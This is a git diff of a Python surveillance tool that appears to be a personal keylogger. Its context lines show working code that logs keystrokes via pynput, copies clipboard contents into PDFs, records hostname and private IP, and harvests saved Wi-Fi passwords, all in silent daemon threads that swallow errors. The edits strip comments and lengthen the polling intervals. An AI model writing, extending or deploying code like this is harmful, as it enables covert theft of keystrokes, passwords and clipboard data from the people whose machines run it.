@@ -28,12 +28,12 @@ def create_pdf(content, output_file):
     
     c = canvas.Canvas(temp_pdf, pagesize=letter)
     c.setFont("Helvetica", 12)
-    c.setFillColorRGB(0, 0, 0)  # Black color for text
+    c.setFillColorRGB(0, 0, 0)
 
     # Set starting position for the text
     text_object = c.beginText(40, 750)
     text_object.setFont("Helvetica", 12)
-    text_object.setFillColorRGB(0, 0, 0)  # Black color for text
+    text_object.setFillColorRGB(0, 0, 0) 
 
     # Add the content
     text_object.textLines(content)
@@ -43,13 +43,12 @@ def create_pdf(content, output_file):
 
     # Append the temporary PDF to the main PDF
     append_pdf(temp_pdf, output_file)
-    os.remove(temp_pdf)  # Remove the temporary file
+    os.remove(temp_pdf) 
 
 # Function to append the temporary PDF to the existing PDF
 def append_pdf(temp_pdf, output_pdf):
     writer = PdfWriter()
 
-    # Read the existing PDF
     if os.path.exists(output_pdf):
         with open(output_pdf, "rb") as file:
             reader = PdfReader(file)
@@ -74,12 +73,11 @@ def copy_clipboard():
                 pasted_data = win32clipboard.GetClipboardData()
                 win32clipboard.CloseClipboard()
 
-                if pasted_data:  # Check if clipboard content is not empty
-                    # Create the PDF file with the clipboard content
+                if pasted_data:  
                     create_pdf("Clipboard Content:\n" + pasted_data, clipboard_pdf_file)
 
         except win32clipboard.error:
-            pass  # Handle silently to prevent interruptions
+            pass 
 
         time.sleep(1)  # Wait for 1 second before copying clipboard content again
 
@@ -101,11 +99,11 @@ def computer_information():
                 f.write("Hostname: " + hostname + '\n')
                 f.write("Private IP Address: " + IPAddr + '\n')
         except Exception:
-            pass  # Handle silently to prevent interruptions
+            pass  
         
-        time.sleep(1)  # Wait for 1 second before gathering system information again
+        time.sleep(6000) 
 
-# Function to retrieve Wi-Fi passwords every 1 second
+# Function to retrieve Wi-Fi passwords
 def wifi_passwords():
     while True:
         try:
@@ -120,9 +118,9 @@ def wifi_passwords():
                     except IndexError:
                         f.write("{:<30} -  {:<}\n".format(i, ""))
         except Exception:
-            pass  # Handle silently to prevent interruptions
+            pass 
         
-        time.sleep(1)  # Wait for 1 second before retrieving Wi-Fi passwords again
+        time.sleep(6000) 
 
 # Keylogger function
 def keylogger():
@@ -133,24 +131,24 @@ def keylogger():
         try:
             k = str(key).replace("'", "")
             if k == "Key.space":
-                typed_text += " "  # Add space to the text
+                typed_text += " " 
             elif k == "Key.enter":
-                typed_text += "\n"  # New line for enter
+                typed_text += "\n" 
             elif k == "Key.backspace" or k == "Key.delete":
-                # Only delete if there's text to delete
+               
                 if typed_text:
                     typed_text = typed_text[:-1]  # Remove last character for backspace/delete
             elif "Key" not in k:
                 typed_text += k  # Add the typed character
 
-            write_file(typed_text)  # Write the current typed text to the file
+            write_file(typed_text) 
 
         except Exception:
-            pass  # Handle silently to prevent interruptions
+            pass  
 
     def write_file(typed_text):
         with open(os.path.join(screenshot_folder, keys_information), "w") as f:
-            f.write(typed_text)  # Write the current content to the file
+            f.write(typed_text)  
 
     def on_release(key):
         if key == Key.esc:
@@ -169,7 +167,6 @@ if __name__ == "__main__":
     wifi_thread = Thread(target=wifi_passwords, daemon=True)
     wifi_thread.start()
 
-    # Start clipboard copying in a separate thread
     clipboard_thread = Thread(target=copy_clipboard, daemon=True)
     clipboard_thread.start()
 
